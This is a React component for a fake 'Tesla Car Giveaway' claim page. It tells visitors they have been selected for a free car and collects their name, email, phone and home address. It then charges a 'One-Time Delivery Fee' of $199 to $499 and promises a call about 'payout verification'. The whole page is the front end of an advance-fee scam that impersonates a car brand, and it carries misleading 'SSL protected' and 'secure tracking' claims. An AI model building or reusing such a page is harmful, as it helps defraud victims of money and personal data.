import React, { useState, useEffect } from 'react';
import { ArrowLeft, Car, User, MapPin, ArrowRight, Loader2, CheckCircle } from 'lucide-react';
import { Car as CarType, SiteSettings, Inquiry } from '../types.js';
import { dbStore } from '../lib/dbStore.js';

interface ClaimPageProps {
  cars: CarType[];
  selectedCar: CarType | null;
  settings: SiteSettings;
  onClose: () => void;
  onSuccess: (newInq: Inquiry) => void;
  theme?: 'light' | 'dark';
}

export default function ClaimPage({
  cars,
  selectedCar,
  settings,
  onClose,
  onSuccess,
  theme = 'light'
}: ClaimPageProps) {
  const activeCars = cars.filter(c => c.active);
  
  // Set default selected car
  const [carId, setCarId] = useState(selectedCar?.id || (activeCars[0]?.id || 'general'));
  const [fullName, setFullName] = useState('');
  const [emailAddress, setEmailAddress] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [streetAddress, setStreetAddress] = useState('');
  const [city, setCity] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [country, setCountry] = useState('');
  
  const [submitting, setSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [success, setSuccess] = useState(false);
  const [createdInquiry, setCreatedInquiry] = useState<Inquiry | null>(null);

  // Sync state if selectedCar changes
  useEffect(() => {
    if (selectedCar) {
      setCarId(selectedCar.id);
    } else if (activeCars.length > 0) {
      setCarId(activeCars[0].id);
    }
  }, [selectedCar, cars]);

  // Determine chosen car details
  const chosenCar = activeCars.find(c => c.id === carId) || activeCars[0];
  const chosenCarName = chosenCar ? chosenCar.name : 'Tesla Model';
  // Helper for delivery rate
  const getDeliveryFee = (price: number) => {
    if (!price) return 199;
    if (price < 45000) return 199;
    if (price >= 45000 && price < 60000) return 299;
    if (price >= 60000 && price < 80000) return 349;
    if (price >= 80000 && price < 120000) return 399;
    return 499;
  };
  const deliveryFee = chosenCar ? getDeliveryFee(chosenCar.price) : 299;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !emailAddress || !phoneNumber || !streetAddress || !city || !country) {
      setErrorMsg('Please complete all required fields.');
      return;
    }

    setSubmitting(true);
    setErrorMsg('');

    const formattedMessage = `Delivery Address Details:
- Street Address: ${streetAddress}
- City: ${city}
- ZIP/Postal: ${zipCode || 'N/A'}
- Country: ${country}

Specifications Choice: Custom Delivery Setup
One-Time Delivery Fee Required: $${deliveryFee}`;

    try {
      // Create inquiry locally in localStorage
      const rawInq = dbStore.createInquiry({
        carId: carId,
        carName: chosenCarName,
        name: fullName,
        email: emailAddress,
        phone: phoneNumber,
        message: formattedMessage
      });

      setCreatedInquiry(rawInq);
      setSuccess(true);
      // Callback to root to fetch and reload list of inquiries so they appear on admin right away
      onSuccess(rawInq);
    } catch (err: any) {
      console.error(err);
      setErrorMsg(err.message || 'Error saving request. Please try again.');
    } finally {
      setSubmitting(false);
    }
  };

  const handleResetAndBack = () => {
    setFullName('');
    setEmailAddress('');
    setPhoneNumber('');
    setStreetAddress('');
    setCity('');
    setZipCode('');
    setCountry('');
    setSuccess(false);
    setErrorMsg('');
    setCreatedInquiry(null);
    onClose();
  };

  return (
    <div 
      id="tesla_claim_now_full_page" 
      className={`min-h-screen select-none pb-16 font-sans transition-colors duration-300 ${
        theme === 'light' ? 'bg-neutral-50 text-neutral-950' : 'bg-neutral-950 text-white'
      }`}
    >
      
      {/* 1. Header Layout mirroring image */}
      <div className={`w-full max-w-xl mx-auto px-4 pt-6 pb-4 flex items-center space-x-3 border-b ${
        theme === 'light' ? 'border-neutral-200 text-neutral-900' : 'border-white/5 text-white'
      }`}>
        <button 
          onClick={onClose} 
          className={`p-1 px-2 -ml-2 transition-colors cursor-pointer flex items-center ${
            theme === 'light' ? 'text-neutral-500 hover:text-neutral-900' : 'text-neutral-400 hover:text-white'
          }`}
          title="Back to Landing Page"
        >
          <ArrowLeft className={`w-5 h-5 ${theme === 'light' ? 'text-neutral-600' : 'text-neutral-300'}`} />
        </button>
        
        <div className="flex items-center space-x-2.5">
          <div className="w-6 h-6 rounded-full bg-red-600 flex items-center justify-center font-display font-semibold text-[10px] text-white">
            T
          </div>
          <span className={`font-semibold text-sm tracking-wide ${theme === 'light' ? 'text-neutral-900' : 'text-white'}`}>
            {settings.logo || 'Tesla'} Car Giveaway — Claim Your Car
          </span>
        </div>
      </div>

      {success && createdInquiry ? (
        /* SUCCESS SUMMARY COMPONENT */
        <div className="w-full max-w-xl mx-auto px-4 mt-8 space-y-6 animate-fadeIn pb-12">
          <div className={`border rounded-3xl p-6 md:p-8 text-center space-y-4 shadow-xl ${
            theme === 'light' ? 'bg-white border-neutral-200' : 'bg-neutral-900 border-white/5 shadow-2xl'
          }`}>
            <div className="w-16 h-16 bg-red-600/10 border border-red-500/30 rounded-full flex items-center justify-center text-red-500 mx-auto animate-bounce">
              <CheckCircle className="w-8 h-8" />
            </div>
            
            <h3 className={`font-display uppercase tracking-widest text-xl font-bold ${theme === 'light' ? 'text-neutral-900' : 'text-white'}`}>
              Congratulations! Order Booked
            </h3>
            
            <p className={`text-xs sm:text-sm leading-relaxed max-w-md mx-auto ${theme === 'light' ? 'text-neutral-600' : 'text-neutral-300'}`}>
              Your free <span className="text-red-500 font-bold">{createdInquiry.carName}</span> configuration has been reserved under secure tracking ID: <strong className={theme === 'light' ? 'text-neutral-800 font-mono' : 'text-white font-mono'}>{createdInquiry.id}</strong>.
            </p>
          </div>

          <div className={`border rounded-3xl p-6 space-y-5 shadow ${
            theme === 'light' ? 'bg-white border-neutral-200' : 'bg-neutral-900 border-white/5'
          }`} id="order_summary_success_card">
            <h4 className={`font-display text-xs font-bold uppercase tracking-widest border-b pb-2.5 ${
              theme === 'light' ? 'border-neutral-200 text-neutral-800' : 'border-white/5 text-white'
            }`}>
              Secure Delivery Order Details
            </h4>

            <div className="space-y-3 font-sans text-xs">
              <div className={`flex justify-between items-baseline py-1.5 border-b ${
                theme === 'light' ? 'border-neutral-100' : 'border-white/[0.03]'
              }`}>
                <span className={`${theme === 'light' ? 'text-neutral-500 font-medium' : 'text-neutral-400 font-medium'}`}>Selected Car Model</span>
                <span className={`font-black uppercase text-right ${theme === 'light' ? 'text-neutral-900' : 'text-white'}`}>{createdInquiry.carName}</span>
              </div>
              <div className={`flex justify-between items-baseline py-1.5 border-b ${
                theme === 'light' ? 'border-neutral-100' : 'border-white/[0.03]'
              }`}>
                <span className={`${theme === 'light' ? 'text-neutral-500 font-medium' : 'text-neutral-400 font-medium'}`}>Full Legal Name</span>
                <span className={`font-semibold text-right ${theme === 'light' ? 'text-neutral-900' : 'text-white'}`}>{createdInquiry.name}</span>
              </div>
              <div className={`flex justify-between items-baseline py-1.5 border-b ${
                theme === 'light' ? 'border-neutral-100' : 'border-white/[0.03]'
              }`}>
                <span className={`${theme === 'light' ? 'text-neutral-500 font-medium' : 'text-neutral-400 font-medium'}`}>Email Address</span>
                <span className={`tracking-wide text-right ${theme === 'light' ? 'text-neutral-900' : 'text-white'}`}>{createdInquiry.email}</span>
              </div>
              <div className={`flex justify-between items-baseline py-1.5 border-b ${
                theme === 'light' ? 'border-neutral-100' : 'border-white/[0.03]'
              }`}>
                <span className={`${theme === 'light' ? 'text-neutral-500 font-medium' : 'text-neutral-400 font-medium'}`}>Phone Number</span>
                <span className={`font-mono text-right ${theme === 'light' ? 'text-neutral-900' : 'text-white'}`}>{createdInquiry.phone}</span>
              </div>
              <div className={`flex justify-between items-start py-1.5 border-b ${
                theme === 'light' ? 'border-neutral-100' : 'border-white/[0.03]'
              }`}>
                <span className={`${theme === 'light' ? 'text-neutral-500 font-medium' : 'text-neutral-400 font-medium'} mt-0.5`}>Shipment Address</span>
                <span className={`font-medium text-right max-w-xs block leading-relaxed ${theme === 'light' ? 'text-neutral-800' : 'text-white'}`}>
                  {streetAddress}, {city}, {zipCode && `${zipCode}, `}{country}
                </span>
              </div>
              <div className={`flex justify-between items-center py-2 px-3.5 rounded-xl border mt-4 ${
                theme === 'light' ? 'bg-neutral-100/50 border-neutral-200' : 'bg-neutral-950 border-white/5'
              }`}>
                <div>
                  <span className={`text-[10px] block uppercase font-mono tracking-wider ${theme === 'light' ? 'text-neutral-500' : 'text-neutral-400'}`}>Original Model Value</span>
                  <span className={`font-mono text-xs line-through ${theme === 'light' ? 'text-neutral-500' : 'text-neutral-500'}`}>$54,990</span>
                </div>
                <div className="text-right">
                  <span className="text-[10px] text-red-500 font-bold block uppercase font-mono tracking-wider">One-Time Delivery Fee</span>
                  <span className="text-red-500 font-black font-mono text-base">${deliveryFee}</span>
                </div>
              </div>
            </div>
          </div>

          <div className={`p-5 rounded-2xl text-xs text-neutral-500 leading-relaxed font-sans text-center border ${
            theme === 'light' ? 'bg-red-50/50 border-red-200/55' : 'bg-red-950/10 border-red-500/10'
          }`}>
            ⚡ <strong>What happens next?</strong> A certified Tesla dispatch specialist will contact your lines at <strong className={theme === 'light' ? 'text-neutral-800 font-mono' : 'text-white font-mono'}>{createdInquiry.phone}</strong> shortly to coordinate secure payout verification and schedule home-delivery times.
          </div>

          <button
            onClick={handleResetAndBack}
            className={`w-full font-bold text-xs uppercase tracking-widest py-4 rounded-xl border transition-colors cursor-pointer ${
              theme === 'light'
                ? 'bg-white border-neutral-300 text-neutral-700 hover:bg-neutral-100'
                : 'bg-neutral-900 border-white/10 text-white hover:bg-neutral-800'
            }`}
          >
            Back to Home
          </button>
        </div>
      ) : (
        /* FORM VIEW MODE */
        <form onSubmit={handleSubmit} className="w-full max-w-xl mx-auto px-4 mt-6 space-y-6">
          
          {/* 2. Winner banner notification card */}
          <div id="winner_banner_card" className={`p-4 rounded-3xl flex items-center space-x-4 border ${
            theme === 'light' ? 'bg-red-55 bg-red-600/10 border-red-500/20' : 'bg-red-950/20 border-red-500/20'
          }`}>
            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center overflow-hidden flex-shrink-0 border shadow-inner ${
              theme === 'light' ? 'bg-neutral-100 border-neutral-200' : 'bg-neutral-900 border-white/5'
            }`}>
              <img
                src={chosenCar?.images?.[0] || 'https://images.unsplash.com/photo-1617788138017-80ad40651399?auto=format&fit=crop&w=150&q=80'}
                alt="Selected white Tesla Giveaway"
                referrerPolicy="no-referrer"
                className="object-contain w-full h-full scale-105"
              />
            </div>
            <div>
              <p className={`font-bold text-xs sm:text-sm flex items-center space-x-1 ${theme === 'light' ? 'text-neutral-950' : 'text-white'}`}>
                <span>🎉</span>
                <span>You've been selected!</span>
              </p>
              <p className="text-red-500 text-[11px] font-semibold mt-0.5">
                Fill in your delivery details.
              </p>
            </div>
          </div>

          {errorMsg && (
            <div className="bg-red-500/10 border border-red-500/20 text-red-450 text-red-600 text-xs p-4 rounded-xl font-sans">
              ⚠️ {errorMsg}
            </div>
          )}

          {/* Card Module 1: Choose Your Tesla Car Model */}
          <div className={`border p-6 rounded-2xl space-y-4 ${
            theme === 'light' ? 'bg-white border-neutral-200 shadow-sm' : 'bg-[#12141c]/50 bg-neutral-900/60 border-white/5'
          }`}>
            <div className={`flex items-center space-x-2 pb-1.5 border-b ${
              theme === 'light' ? 'border-neutral-200 text-neutral-800' : 'border-white/5 text-white'
            }`}>
              <Car className="w-4 h-4 text-red-500" />
              <h3 className="text-xs font-bold uppercase tracking-wider font-display">
                Choose Your Tesla Car Model
              </h3>
            </div>
            <div>
              <select
                value={carId}
                onChange={(e) => setCarId(e.target.value)}
                className={`w-full border rounded px-4 py-3.5 text-xs transition-colors cursor-pointer font-medium ${
                  theme === 'light'
                    ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500'
                    : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500'
                }`}
              >
                {activeCars.map((car) => (
                  <option key={car.id} value={car.id}>
                    {car.name}
                  </option>
                ))}
                {activeCars.length === 0 && (
                  <>
                    <option value="model_3">Tesla Model 3 2025</option>
                    <option value="model_y">Tesla Model Y 2025</option>
                    <option value="model_s">Tesla Model S 2025</option>
                    <option value="model_x">Tesla Model X 2025</option>
                  </>
                )}
              </select>
            </div>
          </div>

          {/* Card Module 2: Personal Information */}
          <div className={`border p-6 rounded-2xl space-y-4 ${
            theme === 'light' ? 'bg-white border-neutral-200 shadow-sm' : 'bg-[#12141c]/50 bg-neutral-900/60 border-white/5'
          }`}>
            <div className={`flex items-center space-x-2 pb-1.5 border-b ${
              theme === 'light' ? 'border-neutral-200 text-neutral-800' : 'border-white/5 text-white'
            }`}>
              <User className="w-4 h-4 text-red-500" />
              <h3 className="text-xs font-bold uppercase tracking-wider font-display">
                Personal Information
              </h3>
            </div>
            <div className="space-y-3 font-sans">
              <div>
                <input
                  type="text"
                  value={fullName}
                  onChange={(e) => setFullName(e.target.value)}
                  required
                  placeholder="Full Name *"
                  className={`w-full border rounded px-4 py-3 text-xs transition-colors font-medium ${
                    theme === 'light'
                      ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500 placeholder-neutral-400'
                      : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500 placeholder-neutral-500'
                  }`}
                />
              </div>
              <div>
                <input
                  type="email"
                  value={emailAddress}
                  onChange={(e) => setEmailAddress(e.target.value)}
                  required
                  placeholder="Email Address *"
                  className={`w-full border rounded px-4 py-3 text-xs transition-colors font-medium ${
                    theme === 'light'
                      ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500 placeholder-neutral-400'
                      : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500 placeholder-neutral-500'
                  }`}
                />
              </div>
              <div>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  required
                  placeholder="Phone Number *"
                  className={`w-full border rounded px-4 py-3 text-xs transition-colors font-medium ${
                    theme === 'light'
                      ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500 placeholder-neutral-400'
                      : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500 placeholder-neutral-500'
                  }`}
                />
              </div>
            </div>
          </div>

          {/* Card Module 3: Delivery Address */}
          <div className={`border p-6 rounded-2xl space-y-4 ${
            theme === 'light' ? 'bg-white border-neutral-200 shadow-sm' : 'bg-[#12141c]/50 bg-neutral-900/60 border-white/5'
          }`}>
            <div className={`flex items-center space-x-2 pb-1.5 border-b ${
              theme === 'light' ? 'border-neutral-200 text-neutral-800' : 'border-white/5 text-white'
            }`}>
              <MapPin className="w-4 h-4 text-red-500" />
              <h3 className="text-xs font-bold uppercase tracking-wider font-display">
                Delivery Address
              </h3>
            </div>
            <div className="space-y-3 font-sans">
              <div>
                <input
                  type="text"
                  value={streetAddress}
                  onChange={(e) => setStreetAddress(e.target.value)}
                  required
                  placeholder="Street Address *"
                  className={`w-full border rounded px-4 py-3 text-xs transition-colors font-medium ${
                    theme === 'light'
                      ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500 placeholder-neutral-400'
                      : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500 placeholder-neutral-500'
                  }`}
                />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <input
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  required
                  placeholder="City *"
                  className={`w-full border rounded px-4 py-3 text-xs transition-colors font-medium ${
                    theme === 'light'
                      ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500 placeholder-neutral-400'
                      : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500 placeholder-neutral-500'
                  }`}
                />
                <input
                  type="text"
                  value={zipCode}
                  onChange={(e) => setZipCode(e.target.value)}
                  placeholder="ZIP / Postal"
                  className={`w-full border rounded px-4 py-3 text-xs transition-colors font-medium ${
                    theme === 'light'
                      ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500 placeholder-neutral-400'
                      : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500 placeholder-neutral-500'
                  }`}
                />
              </div>
              <div>
                <input
                  type="text"
                  value={country}
                  onChange={(e) => setCountry(e.target.value)}
                  required
                  placeholder="Country *"
                  className={`w-full border rounded px-4 py-3 text-xs transition-colors font-medium ${
                    theme === 'light'
                      ? 'bg-neutral-50 border-neutral-300 text-neutral-900 focus:bg-white focus:outline-none focus:border-red-500 placeholder-neutral-400'
                      : 'bg-neutral-950 border-white/10 text-white focus:outline-none focus:border-red-500 placeholder-neutral-500'
                  }`}
                />
              </div>
            </div>
          </div>

          {/* Submission and Delivery Charge disclaimer details */}
          <div className="pt-2 font-mono text-[9px] text-neutral-500 uppercase tracking-wider leading-relaxed text-center">
            * Complete all designated mandatory fields securely • SSL protected environment
          </div>

          {/* Submit Trigger Action matching Order Now -> button exactly */}
          <button
            type="submit"
            disabled={submitting}
            className="w-full bg-red-600 hover:bg-red-700 disabled:bg-neutral-850 text-white font-bold text-xs uppercase tracking-[0.2em] py-4 rounded-xl transition-all shadow-[0_8px_20px_rgba(220,38,38,0.3)] hover:shadow-[0_12px_28px_rgba(220,38,38,0.5)] cursor-pointer flex items-center justify-center space-x-2"
          >
            {submitting ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Syncing details...</span>
              </>
            ) : (
              <>
                <span>Order Now</span>
                <ArrowRight className="w-4.5 h-4.5" />
              </>
            )
            }
          </button>

        </form>
      )}

    </div>
  );
}
